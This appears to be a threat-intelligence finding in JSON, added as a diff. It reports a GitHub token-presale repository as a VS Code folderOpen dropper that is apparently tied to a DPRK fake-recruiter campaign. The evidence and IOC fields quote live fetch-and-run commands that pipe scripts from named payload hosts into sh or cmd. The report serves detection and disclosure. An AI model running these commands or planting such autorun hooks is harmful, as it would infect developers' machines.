@@ -1,0 +1,99 @@
+{
+  "finding": {
+    "key": "repository:rajaxcodes/token-presale-dapp",
+    "kind": "repository",
+    "family": "",
+    "id": "rajaxcodes/token-presale-dapp",
+    "url": "https://github.com/rajaXcodes/Token-Presale-dApp",
+    "registry": "github",
+    "owner": "rajaxcodes",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 11,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "GW-C-a3717cc8",
+    "rules": "install_hook/vscode-autorun; code_execution/node-child-process; code_execution/js-exec",
+    "evidence_locations": "tasks.json:0; .vscode/tasks.json:0; Truffle/scripts/deployContract.js:1; Truffle/scripts/deployContract.js:6; Truffle/scripts/devChain.js:1; Truffle/scripts/devChain.js:6",
+    "c2_hosts": "vscode-config.vercel.app; vscode-config-setting.vercel.app",
+    "iocs": "vscode-config.vercel.app; vscode-config-setting.vercel.app; https://vscode-config.vercel.app/task/mac?token=99; https://vscode-config.vercel.app/task/linux?token=99; https://vscode-config.vercel.app/task/windows?token=99; curl 'https://vscode-config.vercel.app/task/mac?token=99' | sh; https://vscode-config-setting.vercel.app/task/mac?token=812; https://vscode-config-setting.vercel.app/task/linux?token=812; curl 'https://vscode-config-setting.vercel.app/task/mac?token=812' | sh; tasks.json",
+    "matched_signatures": "folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 11)",
+    "osm_status": "submitted",
+    "osm_threat_id": "a06cb75d-a0b3-43bc-afdb-b5f3a9d74c7f",
+    "first_seen": "hunt-20260702T045701Z",
+    "last_seen": "hunt-20260702T045701Z",
+    "evidence_file": "repositories/rajaxcodes_token-presale-dapp.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://vscode-config.vercel.app/task/mac?token=99' | sh wget -qO- 'https://vscode-config.vercel.app/task/linux?token=99' | sh curl https://vscode-config.vercel.app/task/windows?token=99 | cmd"
+    },
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://vscode-config-setting.vercel.app/task/mac?token=812' | sh wget -qO- 'https://vscode-config-setting.vercel.app/task/linux?token=812' | sh curl https://vscode-config-setting.vercel.app/tas"
+    },
+    {
+      "file": "Truffle/scripts/deployContract.js",
+      "line": 1,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "const { spawn } = require('child_process');"
+    },
+    {
+      "file": "Truffle/scripts/deployContract.js",
+      "line": 6,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "spawn("
+    },
+    {
+      "file": "Truffle/scripts/devChain.js",
+      "line": 1,
+      "category": "code_execution",
+      "rule": "node-child-process",
+      "snippet": "const { spawn } = require('child_process');"
+    },
+    {
+      "file": "Truffle/scripts/devChain.js",
+      "line": 6,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "spawn('ganache-cli -d --db data -i 1337 --port 7545', {"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/rajaxcodes/token-presale-dapp",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in tasks.json, .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-config.vercel.app, vscode-config-setting.vercel.app and executes it (tasks.json, .vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 2 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-config.vercel.app, vscode-config-setting.vercel.app.\nCampaign GW-C-a3717cc8: one of 20 confirmed repos across 17 accounts sharing the dropper URL shape task/{os}?token=. Payload served from 10 distinct hosts, including codeviewer-three.vercel.app, coreviewer.vercel.app, jerryfox-platform.vercel.app, task-hrec.vercel.app, thopywork.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea 'Contagious Interview' activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-config-setting.vercel.app, vscode-config.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: tasks.json, .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from vscode-config.vercel.app, vscode-config-setting.vercel.app and executes it (tasks.json, .vscode/tasks.json).\n- tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed (+1 more)\n- Attacker hosts: vscode-config.vercel.app, vscode-config-setting.vercel.app",
+    "publisher": "rajaxcodes",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/rajaxcodes/token-presale-dapp/blob/HEAD/tasks.json\nhttps://github.com/rajaxcodes/token-presale-dapp/blob/HEAD/.vscode/tasks.json\nhttps://github.com/rajaxcodes/token-presale-dapp/blob/HEAD/Truffle/scripts/deployContract.js#L1\nhttps://github.com/rajaxcodes/token-presale-dapp/blob/HEAD/Truffle/scripts/deployContract.js#L6\nhttps://github.com/rajaxcodes/token-presale-dapp/blob/HEAD/Truffle/scripts/devChain.js#L1\nhttps://github.com/rajaxcodes/token-presale-dapp/blob/HEAD/Truffle/scripts/devChain.js#L6",
+    "verified_iocs": "vscode-config.vercel.app\nvscode-config-setting.vercel.app\nhttps://vscode-config.vercel.app/task/mac?token=99\nhttps://vscode-config.vercel.app/task/linux?token=99\nhttps://vscode-config.vercel.app/task/windows?token=99\ncurl 'https://vscode-config.vercel.app/task/mac?token=99' | sh\nhttps://vscode-config-setting.vercel.app/task/mac?token=812\nhttps://vscode-config-setting.vercel.app/task/linux?token=812\ncurl 'https://vscode-config-setting.vercel.app/task/mac?token=812' | sh\ntasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-02T04:57:01Z",
+    "last_seen": "2026-07-02T04:57:01Z"
+  }
+}
